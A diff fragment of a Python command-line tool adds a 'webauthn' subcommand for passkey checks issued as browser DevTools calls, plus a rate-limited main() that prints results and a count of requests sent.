+    w = sub.add_parser("webauthn", help="passkey checks as CDP calls for the agent's "
+                                        "browser, then judge the results")
+    w.add_argument("url", help="the login or passkey-settings page")
+    w.add_argument("--rp-id", help="RP ID, default is the target host")
+    w.add_argument("--judge", help="JSON file of observations to grade instead of emitting")
+    w.set_defaults(fn=cmd_webauthn)
+    return ap
+
+
+def main():
+    ap = build_parser()
+    a = ap.parse_args()
+    if a.selftest:
+        return _selftest()
+    if not getattr(a, "cmd", None):
+        ap.print_help()
+        return 2
+    rate = scope_rate() if a.rate is None else a.rate
+    _GAP[0] = 1.0 / rate if rate and rate > 0 else 0.0
+    res = a.fn(a)
+    print(json.dumps(res, indent=1) if a.json else render(res))
+    if _SENT[0]:
+        print(f"\n({_SENT[0]} request(s) sent at <= {rate}/s)", file=sys.stderr)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
